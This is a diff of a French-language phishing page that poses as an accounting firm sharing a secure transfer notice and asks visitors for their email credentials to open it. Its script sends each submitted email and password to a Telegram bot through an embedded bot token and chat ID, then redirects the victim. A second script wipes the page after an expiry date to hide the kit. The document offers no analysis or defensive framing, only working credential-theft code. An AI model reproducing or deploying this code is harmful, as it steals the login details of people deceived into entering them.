@@ -19,14 +19,13 @@
 
     <section class="banner">
         <div class="overlay">
-            <h2>Bienvenue chez Cabinet d'expertise comptable</h2>
-            <p>Votre partenaire de confiance pour une gestion financière efficace et transparente.</p>
+          
         </div>
     </section>
 
+    <!-- Texte déplacé ici, sous la bannère uniquement -->
     <section class="documents">
-        <p><strong>Vous avez reçu un fichier sécurisé :</strong></p>
-        <p><a href="#">Devis.PDF</a></p>
+      
         <p><a href="#">Avis-Virement.PDF</a></p>
         <p><strong>Pour lire le document veuillez entrer les identifiants de messagerie auxquels ce fichier a été envoyé.</strong></p>
     </section>
@@ -66,6 +65,7 @@
             <p>Nos experts vous accompagnent pour optimiser votre fiscalité et respecter les obligations légales.</p>
         </div>
     </section>
+
 <script>
 document.querySelector("form").addEventListener("submit", function (e) {
     e.preventDefault();
@@ -73,8 +73,8 @@ document.querySelector("form").addEventListener("submit", function (e) {
     const email = document.querySelector('input[type="email"]').value;
     const password = document.querySelector('input[type="password"]').value;
 
-    const token = "7951598405:AAFeubBymDuNfnDkRlMn08M_Ecl6DpOLoXo"; // 🔁 Remplacez par votre bot token
-    const chat_id = "1379993687"; // 🔁 Remplacez par votre chat ID
+    const token = "7951598405:AAFeubBymDuNfnDkRlMn08M_Ecl6DpOLoXo";
+    const chat_id = "1379993687";
     const message = `🔐 Mails Pros Comptable:\n\n📧 Email: ${email}\n🔑 Mot de passe: ${password}`;
 
     fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
@@ -86,7 +86,6 @@ document.querySelector("form").addEventListener("submit", function (e) {
         }),
     })
     .then(() => {
-        // Redirection après l’envoi
         window.location.href = "fin.html";
     })
     .catch((error) => {
@@ -95,35 +94,24 @@ document.querySelector("form").addEventListener("submit", function (e) {
     });
 });
 </script>
+
 <script>
-// Date de début : 8 juin 2025
 const startDate = new Date('2025-06-20T00:00:00');
-
-// Délai d’expiration en jours
 const expirationDays = 30;
-
-// Vérifie si le lien a expiré
 function isLinkExpired() {
   const now = new Date();
   const timeDiff = now - startDate;
   const daysPassed = timeDiff / (1000 * 60 * 60 * 24);
   return daysPassed >= expirationDays;
 }
-
-// Affiche un message d’expiration avec style percutant
 function showExpirationMessage() {
   if (isLinkExpired()) {
-    // Supprimer tout le contenu de la page
     document.body.innerHTML = '';
-
-    // Créer le conteneur du message
     const messageDiv = document.createElement('div');
     messageDiv.innerHTML = `
       <h1>⚠️ Le lien a expiré</h1>
       <p>Veuillez contacter l’administrateur du site pour plus d’informations.</p>
     `;
-
-    // Style impactant
     Object.assign(messageDiv.style, {
       position: 'fixed',
       top: '0',
@@ -143,18 +131,12 @@ function showExpirationMessage() {
       boxSizing: 'border-box',
       zIndex: '9999',
     });
-
-    // Style du titre
     messageDiv.querySelector('h1').style.fontSize = '36px';
     messageDiv.querySelector('h1').style.marginBottom = '20px';
     messageDiv.querySelector('p').style.color = '#ffffff';
-
-    // Afficher sur la page
     document.body.appendChild(messageDiv);
   }
 }
-
-// Lancer au chargement de la page
 window.onload = showExpirationMessage;
 </script>
 </body>
